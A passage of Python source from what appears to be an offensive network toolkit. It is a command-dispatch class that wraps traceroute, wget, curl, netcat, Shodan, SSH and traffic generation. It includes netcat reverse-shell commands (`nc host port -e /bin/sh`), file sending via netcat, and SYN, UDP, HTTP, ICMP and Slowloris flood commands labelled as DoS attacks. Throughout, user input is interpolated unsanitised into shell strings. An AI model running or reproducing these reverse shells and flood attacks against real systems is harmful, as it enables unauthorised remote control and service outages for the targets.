        target = args[0]
        result = self._generic(f'tracepath {target}')
        return result
    
    def _mtr(self, args: List[str]) -> Dict:
        """MTR command"""
        if not args:
            return {'success': False, 'output': 'Usage: mtr <target>'}
        target = args[0]
        result = self._generic(f'mtr --report --report-cycles 1 {target}')
        return result
    
    def _mtr_report(self, args: List[str]) -> Dict:
        """MTR report"""
        if not args:
            return {'success': False, 'output': 'Usage: mtr_report <target>'}
        target = args[0]
        result = self._generic(f'mtr --report {target}')
        return result
    
    def _mtr_json(self, args: List[str]) -> Dict:
        """MTR JSON output"""
        if not args:
            return {'success': False, 'output': 'Usage: mtr_json <target>'}
        target = args[0]
        result = self._generic(f'mtr --json {target}')
        return result
    
    def _traceroute_tcp(self, args: List[str]) -> Dict:
        """TCP traceroute"""
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_tcp <target>'}
        target = args[0]
        result = self._generic(f'traceroute -T {target}')
        return result
    
    def _traceroute_udp(self, args: List[str]) -> Dict:
        """UDP traceroute"""
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_udp <target>'}
        target = args[0]
        result = self._generic(f'traceroute -U {target}')
        return result
    
    def _traceroute_icmp(self, args: List[str]) -> Dict:
        """ICMP traceroute"""
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_icmp <target>'}
        target = args[0]
        result = self._generic(f'traceroute -I {target}')
        return result
    
    def _traceroute_port(self, args: List[str]) -> Dict:
        """Traceroute to specific port"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_port <target> <port>'}
        target = args[0]
        port = args[1]
        result = self._generic(f'traceroute -p {port} {target}')
        return result
    
    def _traceroute_max_hops(self, args: List[str]) -> Dict:
        """Traceroute with max hops"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_max_hops <target> <hops>'}
        target = args[0]
        hops = args[1]
        result = self._generic(f'traceroute -m {hops} {target}')
        return result
    
    def _traceroute_timeout(self, args: List[str]) -> Dict:
        """Traceroute with timeout"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_timeout <target> <timeout>'}
        target = args[0]
        timeout = args[1]
        result = self._generic(f'traceroute -w {timeout} {target}')
        return result
    
    def _traceroute_queries(self, args: List[str]) -> Dict:
        """Traceroute with specific queries"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traceroute_queries <target> <queries>'}
        target = args[0]
        queries = args[1]
        result = self._generic(f'traceroute -q {queries} {target}')
        return result
    
    def _traceroute_numeric(self, args: List[str]) -> Dict:
        """Numeric traceroute (no DNS resolution)"""
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_numeric <target>'}
        target = args[0]
        result = self._generic(f'traceroute -n {target}')
        return result
    
    def _traceroute_as(self, args: List[str]) -> Dict:
        """Traceroute with AS lookup"""
        if not args:
            return {'success': False, 'output': 'Usage: traceroute_as <target>'}
        target = args[0]
        result = self._generic(f'traceroute -A {target}')
        return result
    
    # ==================== WGET COMMAND IMPLEMENTATIONS ====================
    def _wget(self, args: List[str]) -> Dict:
        """Basic wget download"""
        if not args:
            return {'success': False, 'output': 'Usage: wget <url> [output]'}
        url = args[0]
        output = args[1] if len(args) > 1 else None
        result = self.tools.wget_download(url, output)
        return {'success': result.success, 'output': result.output}
    
    def _wget_file(self, args: List[str]) -> Dict:
        """Download to specific file"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_file <url> <filename>'}
        url = args[0]
        filename = args[1]
        result = self.tools.wget_download(url, filename)
        return {'success': result.success, 'output': result.output}
    
    def _wget_recursive(self, args: List[str]) -> Dict:
        """Recursive download"""
        if not args:
            return {'success': False, 'output': 'Usage: wget_recursive <url>'}
        url = args[0]
        result = self._generic(f'wget -r -l 2 -np -nd {url}')
        return result
    
    def _wget_mirror(self, args: List[str]) -> Dict:
        """Mirror a website"""
        if not args:
            return {'success': False, 'output': 'Usage: wget_mirror <url>'}
        url = args[0]
        result = self._generic(f'wget -m {url}')
        return result
    
    def _wget_continue(self, args: List[str]) -> Dict:
        """Continue partial download"""
        if not args:
            return {'success': False, 'output': 'Usage: wget_continue <url>'}
        url = args[0]
        result = self._generic(f'wget -c {url}')
        return result
    
    def _wget_limit_rate(self, args: List[str]) -> Dict:
        """Limit download rate"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_limit_rate <url> <rate>'}
        url = args[0]
        rate = args[1]
        result = self._generic(f'wget --limit-rate={rate} {url}')
        return result
    
    def _wget_quota(self, args: List[str]) -> Dict:
        """Set download quota"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_quota <url> <quota>'}
        url = args[0]
        quota = args[1]
        result = self._generic(f'wget -Q {quota} {url}')
        return result
    
    def _wget_headers(self, args: List[str]) -> Dict:
        """Download with custom headers"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_headers <url> <header>'}
        url = args[0]
        header = args[1]
        result = self._generic(f'wget --header="{header}" {url}')
        return result
    
    def _wget_user_agent(self, args: List[str]) -> Dict:
        """Download with custom user agent"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_user_agent <url> <user_agent>'}
        url = args[0]
        ua = args[1]
        result = self._generic(f'wget -U "{ua}" {url}')
        return result
    
    def _wget_cookies(self, args: List[str]) -> Dict:
        """Download with cookies"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_cookies <url> <cookies>'}
        url = args[0]
        cookies = args[1]
        result = self._generic(f'wget --header="Cookie: {cookies}" {url}')
        return result
    
    def _wget_auth(self, args: List[str]) -> Dict:
        """Download with authentication"""
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: wget_auth <url> <user> <password>'}
        url = args[0]
        user = args[1]
        password = args[2]
        result = self._generic(f'wget --user={user} --password={password} {url}')
        return result
    
    def _wget_proxy(self, args: List[str]) -> Dict:
        """Download through proxy"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_proxy <url> <proxy>'}
        url = args[0]
        proxy = args[1]
        result = self._generic(f'wget -e use_proxy=yes -e http_proxy={proxy} {url}')
        return result
    
    def _wget_https_only(self, args: List[str]) -> Dict:
        """HTTPS only download"""
        if not args:
            return {'success': False, 'output': 'Usage: wget_https_only <url>'}
        url = args[0]
        result = self._generic(f'wget --https-only {url}')
        return result
    
    def _wget_spider(self, args: List[str]) -> Dict:
        """Spider/check links"""
        if not args:
            return {'success': False, 'output': 'Usage: wget_spider <url>'}
        url = args[0]
        result = self._generic(f'wget --spider {url}')
        return result
    
    def _wget_timestamping(self, args: List[str]) -> Dict:
        """Timestamping download"""
        if not args:
            return {'success': False, 'output': 'Usage: wget_timestamping <url>'}
        url = args[0]
        result = self._generic(f'wget -N {url}')
        return result
    
    def _wget_background(self, args: List[str]) -> Dict:
        """Background download"""
        if not args:
            return {'success': False, 'output': 'Usage: wget_background <url>'}
        url = args[0]
        result = self._generic(f'wget -b {url}')
        return result
    
    def _wget_log(self, args: List[str]) -> Dict:
        """Download with logging"""
        if not args:
            return {'success': False, 'output': 'Usage: wget_log <url>'}
        url = args[0]
        log_file = os.path.join(TRAFFIC_LOGS_DIR, f"wget_{int(time.time())}.log")
        result = self._generic(f'wget -o {log_file} {url}')
        return result
    
    def _wget_timeout(self, args: List[str]) -> Dict:
        """Download with timeout"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_timeout <url> <timeout>'}
        url = args[0]
        timeout = args[1]
        result = self._generic(f'wget -T {timeout} {url}')
        return result
    
    def _wget_tries(self, args: List[str]) -> Dict:
        """Download with retries"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_tries <url> <tries>'}
        url = args[0]
        tries = args[1]
        result = self._generic(f'wget -t {tries} {url}')
        return result
    
    def _wget_wait(self, args: List[str]) -> Dict:
        """Download with wait between retries"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_wait <url> <wait>'}
        url = args[0]
        wait = args[1]
        result = self._generic(f'wget -w {wait} {url}')
        return result
    
    # ==================== CURL COMMAND IMPLEMENTATIONS ====================
    def _curl(self, args: List[str]) -> Dict:
        """Basic curl request"""
        if not args:
            return {'success': False, 'output': 'Usage: curl <url>'}
        url = args[0]
        result = self.tools.curl_request(url)
        return {'success': result.success, 'output': result.output}
    
    def _curl_get(self, args: List[str]) -> Dict:
        """GET request"""
        if not args:
            return {'success': False, 'output': 'Usage: curl_get <url>'}
        url = args[0]
        result = self.tools.curl_request(url, 'GET')
        return {'success': result.success, 'output': result.output}
    
    def _curl_post(self, args: List[str]) -> Dict:
        """POST request"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_post <url> <data>'}
        url = args[0]
        data = args[1]
        result = self.tools.curl_request(url, 'POST', data)
        return {'success': result.success, 'output': result.output}
    
    def _curl_put(self, args: List[str]) -> Dict:
        """PUT request"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_put <url> <data>'}
        url = args[0]
        data = args[1]
        result = self.tools.curl_request(url, 'PUT', data)
        return {'success': result.success, 'output': result.output}
    
    def _curl_delete(self, args: List[str]) -> Dict:
        """DELETE request"""
        if not args:
            return {'success': False, 'output': 'Usage: curl_delete <url>'}
        url = args[0]
        result = self.tools.curl_request(url, 'DELETE')
        return {'success': result.success, 'output': result.output}
    
    def _curl_head(self, args: List[str]) -> Dict:
        """HEAD request"""
        if not args:
            return {'success': False, 'output': 'Usage: curl_head <url>'}
        url = args[0]
        result = self.tools.curl_request(url, 'HEAD')
        return {'success': result.success, 'output': result.output}
    
    def _curl_options(self, args: List[str]) -> Dict:
        """OPTIONS request"""
        if not args:
            return {'success': False, 'output': 'Usage: curl_options <url>'}
        url = args[0]
        result = self.tools.curl_request(url, 'OPTIONS')
        return {'success': result.success, 'output': result.output}
    
    def _curl_patch(self, args: List[str]) -> Dict:
        """PATCH request"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_patch <url> <data>'}
        url = args[0]
        data = args[1]
        result = self._generic(f'curl -s -X PATCH -d "{data}" {url}')
        return result
    
    def _curl_headers(self, args: List[str]) -> Dict:
        """Request with headers"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_headers <url> <header>'}
        url = args[0]
        header = args[1]
        result = self._generic(f'curl -s -H "{header}" {url}')
        return result
    
    def _curl_user_agent(self, args: List[str]) -> Dict:
        """Request with custom user agent"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_user_agent <url> <user_agent>'}
        url = args[0]
        ua = args[1]
        result = self._generic(f'curl -s -A "{ua}" {url}')
        return result
    
    def _curl_cookies(self, args: List[str]) -> Dict:
        """Request with cookies"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_cookies <url> <cookies>'}
        url = args[0]
        cookies = args[1]
        result = self._generic(f'curl -s -b "{cookies}" {url}')
        return result
    
    def _curl_auth(self, args: List[str]) -> Dict:
        """Request with authentication"""
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: curl_auth <url> <user> <password>'}
        url = args[0]
        user = args[1]
        password = args[2]
        result = self._generic(f'curl -s -u {user}:{password} {url}')
        return result
    
    def _curl_proxy(self, args: List[str]) -> Dict:
        """Request through proxy"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_proxy <url> <proxy>'}
        url = args[0]
        proxy = args[1]
        result = self._generic(f'curl -s -x {proxy} {url}')
        return result
    
    def _curl_follow(self, args: List[str]) -> Dict:
        """Follow redirects"""
        if not args:
            return {'success': False, 'output': 'Usage: curl_follow <url>'}
        url = args[0]
        result = self._generic(f'curl -s -L {url}')
        return result
    
    def _curl_insecure(self, args: List[str]) -> Dict:
        """Skip SSL verification"""
        if not args:
            return {'success': False, 'output': 'Usage: curl_insecure <url>'}
        url = args[0]
        result = self._generic(f'curl -s -k {url}')
        return result
    
    def _curl_verbose(self, args: List[str]) -> Dict:
        """Verbose request"""
        if not args:
            return {'success': False, 'output': 'Usage: curl_verbose <url>'}
        url = args[0]
        result = self._generic(f'curl -v {url}')
        return result
    
    def _curl_output(self, args: List[str]) -> Dict:
        """Save output to file"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_output <url> <filename>'}
        url = args[0]
        filename = args[1]
        result = self._generic(f'curl -s -o {filename} {url}')
        return result
    
    def _curl_json(self, args: List[str]) -> Dict:
        """JSON request"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_json <url> <json_data>'}
        url = args[0]
        data = args[1]
        result = self._generic(f'curl -s -X POST -H "Content-Type: application/json" -d \'{data}\' {url}')
        return result
    
    def _curl_form(self, args: List[str]) -> Dict:
        """Form data request"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_form <url> <form_data>'}
        url = args[0]
        data = args[1]
        result = self._generic(f'curl -s -X POST -d "{data}" {url}')
        return result
    
    def _curl_upload(self, args: List[str]) -> Dict:
        """File upload"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_upload <url> <file>'}
        url = args[0]
        file_path = args[1]
        result = self._generic(f'curl -s -F "file=@{file_path}" {url}')
        return result
    
    def _curl_download(self, args: List[str]) -> Dict:
        """File download"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_download <url> <filename>'}
        url = args[0]
        filename = args[1]
        result = self._generic(f'curl -s -o {filename} {url}')
        return result
    
    def _curl_resolve(self, args: List[str]) -> Dict:
        """Resolve hostname to IP"""
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: curl_resolve <url> <host> <ip>'}
        url = args[0]
        host = args[1]
        ip = args[2]
        result = self._generic(f'curl -s --resolve {host}:443:{ip} {url}')
        return result
    
    def _curl_connect_timeout(self, args: List[str]) -> Dict:
        """Set connect timeout"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_connect_timeout <url> <timeout>'}
        url = args[0]
        timeout = args[1]
        result = self._generic(f'curl -s --connect-timeout {timeout} {url}')
        return result
    
    def _curl_max_time(self, args: List[str]) -> Dict:
        """Set max time"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_max_time <url> <time>'}
        url = args[0]
        max_time = args[1]
        result = self._generic(f'curl -s --max-time {max_time} {url}')
        return result
    
    def _curl_retry(self, args: List[str]) -> Dict:
        """Set retry count"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_retry <url> <retries>'}
        url = args[0]
        retries = args[1]
        result = self._generic(f'curl -s --retry {retries} {url}')
        return result
    
    # ==================== NETCAT COMMAND IMPLEMENTATIONS ====================
    def _netcat(self, args: List[str]) -> Dict:
        """Netcat connection"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: netcat <host> <port>'}
        host = args[0]
        port = int(args[1])
        result = self.tools.netcat_connect(host, port)
        return {'success': result.success, 'output': result.output}
    
    def _nc_listen(self, args: List[str]) -> Dict:
        """Netcat listener"""
        if not args:
            return {'success': False, 'output': 'Usage: nc_listen <port>'}
        port = args[0]
        result = self._generic(f'nc -lvp {port}')
        return result
    
    def _nc_scan(self, args: List[str]) -> Dict:
        """Netcat port scan"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_scan <host> <port_range>'}
        host = args[0]
        ports = args[1]
        result = self._generic(f'nc -zv {host} {ports}')
        return result
    
    def _nc_transfer(self, args: List[str]) -> Dict:
        """Netcat file transfer"""
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_transfer <host> <port> <file>'}
        host = args[0]
        port = args[1]
        file_path = args[2]
        result = self._generic(f'nc {host} {port} < {file_path}')
        return result
    
    def _nc_shell(self, args: List[str]) -> Dict:
        """Netcat shell"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_shell <host> <port>'}
        host = args[0]
        port = args[1]
        result = self._generic(f'nc {host} {port} -e /bin/sh')
        return result
    
    def _nc_reverse(self, args: List[str]) -> Dict:
        """Netcat reverse shell"""
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_reverse <host> <port> <shell>'}
        host = args[0]
        port = args[1]
        shell = args[2]
        result = self._generic(f'nc {host} {port} -e {shell}')
        return result
    
    def _nc_banner(self, args: List[str]) -> Dict:
        """Netcat banner grab"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_banner <host> <port>'}
        host = args[0]
        port = args[1]
        result = self._generic(f'echo "" | nc -w 2 {host} {port}')
        return result
    
    def _nc_udp(self, args: List[str]) -> Dict:
        """Netcat UDP"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_udp <host> <port>'}
        host = args[0]
        port = args[1]
        result = self._generic(f'nc -u {host} {port}')
        return result
    
    def _nc_verbose(self, args: List[str]) -> Dict:
        """Netcat verbose"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_verbose <host> <port>'}
        host = args[0]
        port = args[1]
        result = self._generic(f'nc -v {host} {port}')
        return result
    
    def _nc_wait(self, args: List[str]) -> Dict:
        """Netcat with wait"""
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_wait <host> <port> <wait>'}
        host = args[0]
        port = args[1]
        wait = args[2]
        result = self._generic(f'nc -w {wait} {host} {port}')
        return result
    
    def _nc_timeout(self, args: List[str]) -> Dict:
        """Netcat with timeout"""
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_timeout <host> <port> <timeout>'}
        host = args[0]
        port = args[1]
        timeout = args[2]
        result = self._generic(f'timeout {timeout} nc {host} {port}')
        return result
    
    def _nc_source_port(self, args: List[str]) -> Dict:
        """Netcat with source port"""
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_source_port <host> <port> <source_port>'}
        host = args[0]
        port = args[1]
        source_port = args[2]
        result = self._generic(f'nc -p {source_port} {host} {port}')
        return result
    
    # ==================== SHODAN COMMAND IMPLEMENTATIONS ====================
    def _shodan_search(self, args: List[str]) -> Dict:
        """Search Shodan"""
        if not args:
            return {'success': False, 'output': 'Usage: shodan_search <query>'}
        query = ' '.join(args)
        if self.shodan:
            result = self.shodan.search(query)
            return {'success': result.success, 'output': result.output}
        return {'success': False, 'output': 'Shodan not available'}
    
    def _shodan_host(self, args: List[str]) -> Dict:
        """Get Shodan host info"""
        if not args:
            return {'success': False, 'output': 'Usage: shodan_host <ip>'}
        ip = args[0]
        if self.shodan:
            result = self.shodan.host_info(ip)
            return {'success': result.success, 'output': result.output}
        return {'success': False, 'output': 'Shodan not available'}
    
    def _shodan_dns(self, args: List[str]) -> Dict:
        """Shodan DNS lookup"""
        if not args:
            return {'success': False, 'output': 'Usage: shodan_dns <domain>'}
        domain = args[0]
        if self.shodan:
            result = self.shodan.dns_lookup(domain)
            return {'success': result.success, 'output': result.output}
        return {'success': False, 'output': 'Shodan not available'}
    
    def _shodan_myip(self, args: List[str]) -> Dict:
        """Get your IP via Shodan"""
        if self.shodan:
            result = self.shodan.get_my_ip()
            return {'success': result.success, 'output': result.output}
        return {'success': False, 'output': 'Shodan not available'}
    
    def _shodan_scan(self, args: List[str]) -> Dict:
        """Request Shodan scan"""
        if not args:
            return {'success': False, 'output': 'Usage: shodan_scan <ip>'}
        ip = args[0]
        if self.shodan:
            result = self.shodan.scan(ip)
            return {'success': result.success, 'output': result.output}
        return {'success': False, 'output': 'Shodan not available'}
    
    # ==================== SSH COMMAND IMPLEMENTATIONS ====================
    def _ssh_add(self, args: List[str]) -> Dict:
        """Add SSH connection"""
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_add <name> <host> <username> [password]'}
        name = args[0]
        host = args[1]
        username = args[2]
        password = args[3] if len(args) > 3 else None
        conn = self.ssh.add_connection(name, host, username, password)
        return {'success': True, 'output': f"SSH connection added: {conn.name} (ID: {conn.id})"}
    
    def _ssh_list(self, args: List[str]) -> Dict:
        """List SSH connections"""
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        connections = self.ssh.get_connections()
        if not connections:
            return {'success': True, 'output': 'No SSH connections configured'}
        output = "SSH Connections:\n"
        for conn in connections:
            status = "✅" if conn['connected'] else "❌"
            output += f"  {status} {conn['name']} - {conn['host']}:{conn['port']} ({conn['username']})\n"
        return {'success': True, 'output': output}
    
    def _ssh_connect(self, args: List[str]) -> Dict:
        """Connect to SSH server"""
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: ssh_connect <conn_id>'}
        conn_id = args[0]
        if self.ssh.connect(conn_id):
            return {'success': True, 'output': f"Connected to {conn_id}"}
        return {'success': False, 'output': f"Failed to connect to {conn_id}"}
    
    def _ssh_exec(self, args: List[str]) -> Dict:
        """Execute SSH command"""
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <conn_id> <command>'}
        conn_id = args[0]
        command = ' '.join(args[1:])
        result = self.ssh.execute_command(conn_id, command)
        return {'success': result.success, 'output': result.output}
    
    def _ssh_disconnect(self, args: List[str]) -> Dict:
        """Disconnect SSH"""
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        conn_id = args[0] if args else None
        if conn_id:
            self.ssh.disconnect(conn_id)
            return {'success': True, 'output': f"Disconnected from {conn_id}"}
        else:
            return {'success': False, 'output': 'Usage: ssh_disconnect <conn_id>'}
    
    def _ssh_delete(self, args: List[str]) -> Dict:
        """Delete SSH connection"""
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: ssh_delete <conn_id>'}
        conn_id = args[0]
        if self.ssh.delete_connection(conn_id):
            return {'success': True, 'output': f"Deleted SSH connection {conn_id}"}
        return {'success': False, 'output': f"Failed to delete {conn_id}"}
    
    def _ssh_keygen(self, args: List[str]) -> Dict:
        """Generate SSH key"""
        key_type = args[0] if args else 'rsa'
        key_file = args[1] if len(args) > 1 else os.path.join(SSH_KEYS_DIR, f"id_{key_type}")
        result = self._generic(f'ssh-keygen -t {key_type} -f {key_file} -N ""')
        return result
    
    def _ssh_copy_id(self, args: List[str]) -> Dict:
        """Copy SSH key to server"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_copy_id <user> <host>'}
        user = args[0]
        host = args[1]
        result = self._generic(f'ssh-copy-id {user}@{host}')
        return result
    
    def _ssh_tunnel(self, args: List[str]) -> Dict:
        """Create SSH tunnel"""
        if len(args) < 4:
            return {'success': False, 'output': 'Usage: ssh_tunnel <local_port> <remote_host> <remote_port> <ssh_host>'}
        local_port = args[0]
        remote_host = args[1]
        remote_port = args[2]
        ssh_host = args[3]
        result = self._generic(f'ssh -L {local_port}:{remote_host}:{remote_port} -N {ssh_host}')
        return result
    
    def _ssh_socks(self, args: List[str]) -> Dict:
        """Create SOCKS proxy"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_socks <local_port> <ssh_host>'}
        local_port = args[0]
        ssh_host = args[1]
        result = self._generic(f'ssh -D {local_port} -N {ssh_host}')
        return result
    
    def _ssh_scp(self, args: List[str]) -> Dict:
        """SCP file transfer"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_scp <source> <destination>'}
        source = args[0]
        destination = args[1]
        result = self._generic(f'scp {source} {destination}')
        return result
    
    def _ssh_sftp(self, args: List[str]) -> Dict:
        """SFTP session"""
        if not args:
            return {'success': False, 'output': 'Usage: ssh_sftp <host>'}
        host = args[0]
        result = self._generic(f'sftp {host}')
        return result
    
    # ==================== TRAFFIC GENERATION COMMAND IMPLEMENTATIONS ====================
    def _traffic(self, args: List[str]) -> Dict:
        """Generate traffic"""
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: traffic <type> <ip> <duration> [port] [rate]'}
        traffic_type = args[0].lower()
        target_ip = args[1]
        try:
            duration = int(args[2])
        except:
            return {'success': False, 'output': f'Invalid duration: {args[2]}'}
        port = int(args[3]) if len(args) > 3 and args[3].isdigit() else None
        rate = int(args[4]) if len(args) > 4 and args[4].isdigit() else 100
        
        try:
            generator = self.traffic.generate(traffic_type, target_ip, duration, port, rate)
            return {'success': True, 'output': f"🚀 Generating {traffic_type} traffic to {target_ip} for {duration}s"}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _traffic_types(self, args: List[str]) -> Dict:
        """List traffic types"""
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        types = self.traffic.get_available_types()
        output = "Available traffic types:\n" + "\n".join([f"  • {t}" for t in types])
        return {'success': True, 'output': output}
    
    def _traffic_stop(self, args: List[str]) -> Dict:
        """Stop traffic generation"""
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        generator_id = args[0] if args else None
        if self.traffic.stop(generator_id):
            return {'success': True, 'output': 'Traffic stopped'}
        return {'success': False, 'output': 'Failed to stop traffic'}
    
    def _traffic_status(self, args: List[str]) -> Dict:
        """Get traffic status"""
        if not self.traffic:
            return {'success': False, 'output': 'Traffic generator not initialized'}
        active = self.traffic.get_active()
        if not active:
            return {'success': True, 'output': 'No active traffic generators'}
        output = "Active Traffic Generators:\n"
        for g in active:
            output += f"  • {g['target_ip']} - {g['traffic_type']} ({g['packets_sent']} packets)\n"
        return {'success': True, 'output': output}
    
    def _traffic_icmp(self, args: List[str]) -> Dict:
        """Generate ICMP traffic"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traffic_icmp <ip> <duration>'}
        return self._traffic(['icmp'] + args)
    
    def _traffic_tcp(self, args: List[str]) -> Dict:
        """Generate TCP traffic"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traffic_tcp <ip> <duration> [port]'}
        return self._traffic(['tcp_syn'] + args)
    
    def _traffic_udp(self, args: List[str]) -> Dict:
        """Generate UDP traffic"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traffic_udp <ip> <duration> [port]'}
        return self._traffic(['udp'] + args)
    
    def _traffic_http(self, args: List[str]) -> Dict:
        """Generate HTTP traffic"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traffic_http <ip> <duration> [port]'}
        return self._traffic(['http_get'] + args)
    
    def _traffic_dns(self, args: List[str]) -> Dict:
        """Generate DNS traffic"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traffic_dns <ip> <duration>'}
        return self._traffic(['dns'] + args)
    
    def _traffic_arp(self, args: List[str]) -> Dict:
        """Generate ARP traffic"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traffic_arp <ip> <duration>'}
        return self._traffic(['arp'] + args)
    
    def _traffic_mixed(self, args: List[str]) -> Dict:
        """Generate mixed traffic"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traffic_mixed <ip> <duration>'}
        return self._traffic(['mixed'] + args)
    
    def _traffic_flood(self, args: List[str]) -> Dict:
        """Generate flood traffic"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: traffic_flood <ip> <duration>'}
        return self._traffic(['icmp'] + args + ['1000'])
    
    # ==================== DOS ATTACK COMMAND IMPLEMENTATIONS ====================
    def _dos_syn(self, args: List[str]) -> Dict:
        """SYN flood attack"""
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_syn <ip> <port> <duration> [threads]'}
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3]) if len(args) > 3 else 50
        return self.dos.syn_flood(target_ip, port, duration, threads)
    
    def _dos_udp(self, args: List[str]) -> Dict:
        """UDP flood attack"""
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_udp <ip> <port> <duration> [threads]'}
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3]) if len(args) > 3 else 50
        return self.dos.udp_flood(target_ip, port, duration, threads)
    
    def _dos_http(self, args: List[str]) -> Dict:
        """HTTP flood attack"""
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_http <ip> <port> <duration> [threads]'}
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        threads = int(args[3]) if len(args) > 3 else 50
        return self.dos.http_flood(target_ip, port, duration, threads)
    
    def _dos_icmp(self, args: List[str]) -> Dict:
        """ICMP flood attack"""
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: dos_icmp <ip> <duration> [threads]'}
        target_ip = args[0]
        duration = int(args[1])
        threads = int(args[2]) if len(args) > 2 else 50
        return self.dos.icmp_flood(target_ip, duration, threads)
    
    def _dos_stop(self, args: List[str]) -> Dict:
        """Stop DOS attack"""
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        attack_id = args[0] if args else None
        if self.dos.stop(attack_id):
            return {'success': True, 'output': 'DOS attack stopped' + (f' ({attack_id})' if attack_id else '')}
        return {'success': False, 'output': 'Failed to stop DOS attack'}
    
    def _dos_status(self, args: List[str]) -> Dict:
        """Get DOS attack status"""
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        active = self.dos.get_active()
        if not active:
            return {'success': True, 'output': 'No active DOS attacks'}
        output = "Active DOS Attacks:\n"
        for a in active:
            output += f"  • {a['type']} attack on {a['target']}\n"
        return {'success': True, 'output': output}
    
    def _dos_slowloris(self, args: List[str]) -> Dict:
        """Slowloris attack"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: dos_slowloris <ip> <port> [duration]'}
        target_ip = args[0]
        port = int(args[1])
        duration = int(args[2]) if len(args) > 2 else 60
        return {'success': True, 'output': f"Slowloris attack started on {target_ip}:{port} for {duration}s (simplified)"}
    
    def _dos_syn_flood(self, args: List[str]) -> Dict:
        """SYN flood (alias)"""
